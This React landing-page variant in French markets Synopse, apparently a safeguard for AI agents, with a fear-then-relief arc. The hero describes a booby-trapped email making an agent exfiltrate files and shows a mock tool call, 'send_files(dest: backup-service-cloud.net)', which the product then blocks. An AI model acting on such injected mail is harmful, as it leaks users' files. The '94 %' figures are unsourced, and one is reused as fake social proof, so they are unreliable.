/**
 * Direction B — « Peur → Soulagement » (émotionnel / narratif).
 * Idée : ouvrir sur la tension (hero sombre, l'attaque en cours), puis basculer vers le calme
 * menthe. Colle au trafic TikTok/X « chaud sur la peur, froid sur la marque ».
 * Diffère sur : tonalité/composition (arc sombre→clair) + emphase contenu (peur d'abord).
 */
import { CtaLink } from "../../landing/analytics";
import { Reveal } from "../../landing/reveal";
import { Counter } from "../../landing/counter";
import { ExploreBar } from "../parts";

const CTA = "inline-flex items-center gap-2 rounded-full bg-mint-500 px-7 py-3.5 font-semibold text-white shadow-[0_10px_40px_-10px_rgba(16,185,129,0.6)] transition duration-200 hover:bg-mint-400 hover:-translate-y-0.5";

export default function DirB() {
  return (
    <div className="min-h-screen pt-10">
      <ExploreBar current="b" />
      {/* Hero sombre : la tension */}
      <section className="relative overflow-hidden bg-ink-950 px-6 pb-28 pt-20 text-white">
        <div className="glow pointer-events-none absolute left-1/2 top-1/4 h-[420px] w-[620px] -translate-x-1/2 opacity-20" aria-hidden />
        <div className="relative mx-auto max-w-3xl text-center">
          <Reveal>
            <span className="inline-flex items-center gap-2 rounded-full border border-red-500/40 bg-red-500/10 px-3 py-1 text-xs font-medium text-red-300">
              <span className="h-1.5 w-1.5 rounded-full bg-red-400 pulse-ring" /> 94 % des agents IA sont piratables
            </span>
          </Reveal>
          <Reveal delay={80}>
            <h1 className="mt-6 text-4xl font-bold leading-[1.1] md:text-[3.4rem]">
              Ton agent peut vider ton compte<br />
              <span className="text-ink-300">pendant que tu dors.</span>
            </h1>
          </Reveal>
          <Reveal delay={160}>
            <p className="mx-auto mt-6 max-w-xl text-lg text-ink-300">
              Un simple mail piégé, et il envoie tes fichiers à un inconnu. Sans filet, tu ne le sais qu&apos;au réveil.
            </p>
          </Reveal>
          <Reveal delay={220}>
            <div className="mx-auto mt-8 max-w-sm rounded-2xl border border-red-500/30 bg-white/5 p-4 text-left font-mono text-sm">
              <p className="text-red-300">→ send_files(dest: backup-service-cloud.net)</p>
              <p className="mt-1 text-white/50">47 fichiers · ~/clients · 03:14</p>
            </div>
          </Reveal>
        </div>
      </section>

      {/* Bascule : le soulagement */}
      <section className="relative overflow-hidden px-6 py-24 text-center">
        <div className="glow pointer-events-none absolute left-1/2 top-0 h-[360px] w-[560px] -translate-x-1/2 opacity-30" aria-hidden />
        <div className="relative mx-auto max-w-2xl">
          <Reveal>
            <p className="eyebrow">Respire.</p>
            <h2 className="mt-4 text-3xl font-bold md:text-4xl">Synopse t&apos;aurait demandé avant.</h2>
            <p className="mx-auto mt-4 max-w-md text-lg text-ink-500">
              Validation sur Telegram, plafonds de dépense, kill switch. Tu gardes le contrôle — même endormi.
            </p>
          </Reveal>
          <Reveal delay={120}>
            <div className="mx-auto mt-8 max-w-sm rounded-2xl border border-mint-300 bg-mint-50 p-4 text-left text-sm">
              <p className="font-medium">🛡️ Bloqué avant exécution — tu as été prévenu.</p>
              <p className="mt-1 text-ink-500">1 tentative d&apos;exfiltration stoppée cette nuit.</p>
            </div>
          </Reveal>
          <Reveal delay={200}>
            <div className="mt-9"><CtaLink place="hero-b" className={CTA}>Protéger mon agent — gratuit <span aria-hidden>→</span></CtaLink></div>
            <p className="mt-3 text-sm text-ink-400">Rejoint <Counter value={94} suffix=" %" /> de gens qui dorment mieux (bientôt tes témoignages ici)</p>
          </Reveal>
        </div>
      </section>
      <p className="pb-16 text-center text-sm text-ink-400">↑ Direction B : arc émotionnel peur→soulagement, calé sur le trafic viral.</p>
    </div>
  );
}
